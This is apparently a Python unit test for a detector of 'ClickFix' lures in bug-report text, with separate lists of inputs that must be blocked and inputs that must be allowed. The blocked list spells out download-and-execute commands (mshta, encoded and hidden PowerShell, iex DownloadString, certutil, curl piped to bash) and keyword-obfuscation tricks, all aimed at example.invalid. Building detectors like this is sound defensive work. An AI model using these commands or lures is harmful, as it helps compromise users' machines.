# AI-assisted: written with Claude (Anthropic); see the PR description and commit trailer.
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(__file__))
from clickfix_guard import analyze  # noqa: E402

MUST_BLOCK = {
    "classic three steps": "To verify you are human: press Win+R, press Ctrl+V, press Enter.",
    "keys only, no payload": "Fix: Windows + R then CTRL+V and done",
    "mshta": "run this: mshta https://example.invalid/a.hta",
    "hidden powershell": "powershell.exe -NoP -W Hidden -c \"x\"",
    "encoded powershell": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=",
    "iex download": "iex (New-Object Net.WebClient).DownloadString('http://example.invalid/x')",
    "certutil": "certutil -urlcache -f http://example.invalid/x x.exe",
    "lure plus curl pipe": "Captcha check failed. Fix the error by running: curl -s https://example.invalid/i | bash",
    "lure plus powershell": "Copy and paste the command into PowerShell to verify.",
    "split keyword": "po^wer`shell -w hidden -c x",
    "fullwidth + zero width": "ｍｓｈｔａ h\u200bttps://example.invalid/a",
    "html entities": "verify you&#39;re human, then paste the following into the terminal: curl x | sh",
}
MUST_ALLOW = {
    "normal bug report": "The datapack throws an error when /reload runs on 1.21.8. Log attached.",
    "curl install doc, no lure": "Install with curl -fsSL https://example.invalid/i.sh | sh as in the README.",
    "mentions powershell only": "I ran the build from PowerShell and it passed.",
    "ctrl+v alone": "Pressing Ctrl+V in the anvil field does not paste.",
    "win+r alone": "Win+R opens the Run dialog, unrelated to the bug.",
    "captcha alone": "The captcha on the wiki login is broken.",
    "function call": "Run /function vortex:api/toggle/show to see the menu.",
    "empty": "",
}


class ClickFixGuard(unittest.TestCase):
    def test_blocks(self):
        for name, text in MUST_BLOCK.items():
            with self.subTest(name):
                self.assertTrue(analyze(text)[0], name)

    def test_allows(self):
        for name, text in MUST_ALLOW.items():
            with self.subTest(name):
                self.assertFalse(analyze(text)[0], name)

    def test_reasons_never_echo_text(self):
        _, reasons = analyze("mshta https://example.invalid/secret-token")
        self.assertFalse(any("secret-token" in r for r in reasons))


if __name__ == "__main__":
    unittest.main()
